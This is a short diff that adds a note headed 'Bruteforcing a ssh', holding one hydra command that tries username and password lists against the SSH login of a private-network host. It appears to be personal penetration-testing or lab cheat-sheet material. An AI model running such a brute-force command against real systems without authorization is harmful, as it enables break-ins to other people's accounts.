@@ -1,0 +1,4 @@
+
+
+Bruteforcing a ssh:
+$ hydra -L /path/to/users.txt -P /path/to/passwords.txt ssh://192.168.66.55 -V
